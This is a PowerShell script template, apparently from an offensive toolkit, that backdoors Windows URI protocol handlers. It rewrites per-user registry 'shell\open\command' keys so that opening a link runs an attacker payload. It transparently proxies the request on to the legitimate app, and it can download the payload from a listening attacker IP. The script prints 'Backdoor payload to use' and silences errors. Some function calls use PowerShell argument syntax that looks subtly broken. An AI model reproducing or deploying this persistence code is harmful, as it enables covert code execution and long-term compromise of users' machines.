Begin {
    $listeningIp = "{listeningIp}"
    $httpPort = "{httpPort}"
    $isOnlineFetch = "{ISONLINEFETCH}"
    $proxyRequest = "{PROXYREQUEST}"

    $payloadsDetails =
    @(
    "{{PAYLOADS}}"
    )

    function UpdateRegistryKey($gadgetPayload, $cmdSeparator, $defaultHandler)
    {
        $ErrorActionPreference = "SilentlyContinue"
        New-Item -Path "HKCU:\\Software\Classes\" -name "$appxID"
        New-Item -Path "HKCU:\\Software\Classes\$appxID\" -Name "shell"
        New-Item -Path "HKCU:\\Software\Classes\$appxID\shell\" -Name "open"
        New-Item -Path "HKCU:\\Software\Classes\$appxID\shell\open\" -Name "command"
        Write-Host -BackgroundColor Red "Universal App to hijack:"
        Write-Host -BackgroundColor DarkGray "$appxID"
        Write-Host -BackgroundColor Red "Backdoor payload to use:"
        Write-Host -BackgroundColor DarkGray "$gadgetPayload $cmdSeparator $defaultHandler"
        Set-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "(Default)" -value "$gadgetPayload $cmdSeparator $defaultHandler"
        Remove-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "DelegateExecute"
    }
}

Process {
    $payloadsDetails | ForEach-Object {
        $gadgetPayload = If ($isOnlineFetch)
        {
            (New-Object net.webclient).DownloadString("http://" + $listeningIp + ":" + $httpPort + "/" + $_.UniqueID)
        }
        else
        {
            $_.PayloadContent
        }
        $uriProtocol = $_.UriProtocol; $cmdSeparator = If ($gadgetPayload -match "powershell")
        {
            ";"
        }
        Else
        {
            "&"
        }

        try # check if user has already chosen a default Universal App handler for the defined URI scheme via 'UserChoice' key lookup
        {
            $appxID = $( Get-ItemProperty -Path "HKCU:\\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\$uriProtocol\UserChoice" -Name "ProgID" -ErrorAction Stop ).ProgId
            # get absolute pathname of the binary of the Universal App (via lookup in HKLM and as fallback in HKEY_CURRENT_USER
            $binPathDefaultHandler = $( Get-ItemProperty -Path "HKLM:\\SOFTWARE\Classes\$appxID\shell\open\command" -Name "(Default)" -ErrorAction SilentlyContinue )."(default)"
            if ( [string]::IsNullOrEmpty($binPathDefaultHandler))
            {
                $binPathDefaultHandler = $( Get-ItemProperty -Path "HKCU:\\SOFTWARE\Classes\$appxID\shell\open\command" -Name "(Default)" -ErrorAction SilentlyContinue )."(default)"
            }
            UpdateRegistryKey($gadgetPayload, $cmdSeparator, $binPathDefaultHandler)
        }
        catch # if no explicit default app has been chosen, then lookup via 'windows.protocol' and backdoor all the Universal App IDs available for the defined URI protocol
        {
            if ($proxyRequest)
            {
                $proxySymbol = "%1"
            }
            New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR -ErrorAction SilentlyContinue
            Set-Location "HKCR:Local Settings\Software\Microsoft\Windows\CurrentVersion\AppModel\PackageRepository\Extensions\windows.protocol\$uriProtocol" -ErrorAction SilentlyContinue
            $appxIDs = $( Get-ChildItem . ).PSChildName
            if ($appxIDs)
            {
                $appxIDs | ForEach-Object {
                    $appxID = $_
                    # find the modelId to trigger the legitimate handler via 'shell:\Appsfolder\$AppUserModelID' shortcut and transparently proxy the request to it
                    try
                    {
                        $AppUserModelID = (Get-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Application" -ErrorAction Stop).AppUserModelID
                        UpdateRegistryKey($gadgetPayload, $cmdSeparator, "explorer.exe shell:Appsfolder\$AppUserModelID $proxySymbol %*")
                    }
                    catch # if key does not exists yet, create it
                    {
                        UpdateRegistryKey($gadgetPayload, "", "")
                    }
                }
            }
        }
    }
}

End {
    [GC]::Collect()
}

